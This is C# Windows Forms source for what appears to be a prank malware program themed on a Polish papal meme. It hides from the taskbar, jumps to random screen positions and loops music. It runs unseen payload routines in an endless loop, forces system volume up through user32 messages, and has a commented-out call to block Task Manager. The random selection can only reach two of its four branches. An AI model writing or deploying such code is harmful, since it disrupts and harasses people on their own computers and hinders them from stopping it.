using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Media;
using System.Runtime.InteropServices;

namespace Watykańczyk1
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr Hwnd, int Msg, IntPtr wParam, IntPtr lParam);

        public const int APPCOMMAND_VOLUME_UP = 0xA000;
        public const int WM_APPCOMANND = 0x319;
        public Form1()
        {
            Random random = new Random();
            int x = random.Next(0, 1270);
            int y = random.Next(0, 920);
            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(x, y);
            this.ShowInTaskbar = false;

            InitializeComponent();

            new Thread(() =>
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.musico);
                player.PlayLooping();
            }).Start();
            RandomPayload();
        }

        private void RandomPayload()
        {
            Payload payload = new Payload();
            //payload.BlockTaskMgr();
            while (true)
            {
                Random random = new Random();
                int x = random.Next(1,3);
                switch (x)
                {
                    case 1:
                        payload.payload1();
                        break;
                    case 2:
                        payload.payload2();
                        break;
                    case 3:
                        payload.InsertKremowka();
                        break;
                    case 4:
                        VOL();
                        break;
                }
                Thread.Sleep(10000);
            }
        }

        private void VOL()
        {
            for(int i = 0; i < 20; i++)
            {
                SendMessageW(this.Handle, WM_APPCOMANND, this.Handle, (IntPtr)APPCOMMAND_VOLUME_UP);
            }
        }
    }
}
